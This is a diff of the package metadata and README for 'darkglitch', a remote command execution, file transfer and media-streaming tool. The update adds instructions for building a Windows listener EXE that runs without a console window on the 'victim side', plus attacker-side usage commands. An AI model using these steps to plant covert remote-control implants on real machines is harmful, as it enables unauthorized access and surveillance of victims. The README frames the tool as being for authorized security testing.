@@ -1,6 +1,6 @@
 Metadata-Version: 2.4
 Name: darkglitch
-Version: 1.1.9
+Version: 1.2.0
 Summary: Remote command delivery and media streaming tool over WebRTC signaling
 Author: DarkGlitch
 License-Expression: MIT
@@ -24,11 +24,18 @@ Requires-Dist: opencv-python>=4.13.0
 Requires-Dist: Pillow>=10.0.0
 Requires-Dist: websockets>=12.0.0
 Requires-Dist: ollama>=0.2.0
+Requires-Dist: pyinstaller>=6.0.0
 Dynamic: license-file
 
-# darkglitch
+<div align="center">
+  <img src="./glitch.gif" alt="darkglitch" />
 
-darkglitch is a lightweight Python proof-of-concept for remote command execution, file transfer, and media streaming over a WebSocket signaling channel. It is intended for authorized security testing and educational use.
+  # darkglitch
+
+  darkglitch is a lightweight Python proof-of-concept for remote command execution, file transfer, and media streaming over a WebSocket signaling channel. It is intended for authorized security testing and educational use.
+</div>
+
+
 
 ## What it supports
 
@@ -74,9 +81,20 @@ ROOM = "your-room"
 
 ### 1. Start a listener (victim side)
 
+Start from source:
+
 ```bash
 python darkglitch.py -l -c
 ```
+
+Or generate a Windows EXE that auto-starts the same listener:
+
+```bash
+python darkglitch.py -r
+```
+
+The output is placed in `./dist/darkglitch_listener.exe` (built with `--noconsole`, so it should not pop a console window). 
+
 
 ### 2. List online peers (attacker side)
 
